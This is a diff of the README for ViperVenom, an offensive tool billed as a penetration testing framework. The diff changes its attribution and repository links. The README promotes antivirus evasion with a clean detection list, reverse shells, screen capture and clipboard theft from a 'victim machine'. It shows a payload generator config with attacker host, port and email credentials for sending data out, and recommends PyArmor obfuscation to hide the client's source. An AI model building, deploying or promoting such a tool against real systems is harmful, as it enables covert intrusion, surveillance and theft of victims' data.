@@ -1,4 +1,4 @@
-<img src="https://github.com/Vultrlabs/ViperVenom/blob/main/misc/500xLogoTranspert.png?raw=true" width="500">
+
 
 # ViperVenom, Penetration Testing Framework.
 ```
@@ -21,13 +21,9 @@ The quieter you become, the more you can hear, ViperVenom
 
 ViperVenom2 landing(vipervenom/framework) >
 ```
-ViperVenom is an open-source cyber offensive tool developed by the Israeli software engineering, web hosting, and malware investigation firm, [Vultrlabs](https://vultrlabs.net)
-for pentesters.
+ViperVenom is an open-source cyber offensive tool developed by Itay Funes for pentesters.
 ViperVenom is a great tool when it comes to pentesting assessments, as some sort of a proof
 that you broke into a computer and were able to install ViperVenom to capture the screen or popping shell without worrying about antiviruses.
-
-Help us improve the tool by [contacting us](https://vultrlabs.net/contacts/), or by sending an [issue](https://github.com/Vultrlabs/ViperVenom/issues)
-Keep in mind, the tool is currently in beta, bugs may happen.
 
 # Last Anti Virus Detections Test
 File Name: viperv.exe
@@ -68,7 +64,7 @@ zillya:Clean
 To create the latest tool for your platform from this source repository:
 
 ##### Download and extract the source:
-[Download Directly from GitHub](https://github.com/Vultrlabs/ViperVenom/archive/refs/heads/main.zip)
+[Download Directly from GitHub](https://github.com/seized-org/ViperVenom/archive/refs/heads/main.zip)
 ```
 $ unzip ViperVenom-main.zip
 $ cd ViperVenom-main
@@ -76,7 +72,7 @@ $ cd ViperVenom-main
 **NOTE:** Instead of downloading the compressed source, you may instead want to clone the GitHub 
 repository:
 ```
-$ git clone https://github.com/Vultrlabs/ViperVenom.git
+$ git clone https://github.com/seized-org/ViperVenom.git
 $ cd ViperVenom
 $ pip3 install -r requirements.txt
 $ python3 vipervenom.py
@@ -141,7 +137,7 @@ EXAMPLE:
 (Generator) Windows/ViperVenom/TCP/Payload > options
 HOST=10.10.1.107
 PORT=443
-GAMILADDR=vultrlabs@example.com
+GAMILADDR=seized-org@example.com
 GAMILPASS=P@$$W0RD_ON3
 FILENAME=NULL.py
 SLEEP=60
@@ -274,9 +270,6 @@ Merciless Technology creates mutants of ViperVenom payloads across the system (B
 clipboard
 ```
 This command will grab the victim machine's clipboard, use this command after gaining a shell access only.
-## Recommeneded!
-As we are developing Vultrlabs's ViperVenom, Vultrlabs tested [pyarmor](https://pypi.org/project/pyarmor/),
-PyArmor is a command-line tool used to obfuscate python scripts, so you can encode your client file so the source code won't be shown.
 ```
 $ pip3 install pyarmor
 $ cd vipervenom-main
@@ -308,8 +301,7 @@ After that you should see a bunch of stuff in the terminal, don't worry, it is j
 The file should appear in the "build" folder.
 
 # Get in Touch
-For more detailed information on developing ViperVenom, please contact us at [our website](https://vultrlabs.net/contacts). 
-Vultrlabs does not take any responsibility in misuse, or for illegal purposes, we cannot control the tool if it goes to the wrong hand as we do not have a kill switch.
+"seized-org" does not take any responsibility in misuse, or for illegal purposes, we cannot control the tool if it goes to the wrong hand as we do not have a kill switch.
 
-[Vultrlabs]: https://vultrlabs.net
-[Download file]: https://github.com/Vultrlabs/ViperVenom/archive/refs/heads/main.zip
+
+[Download file]: https://github.com/seized-org/ViperVenom/archive/refs/heads/main.zip
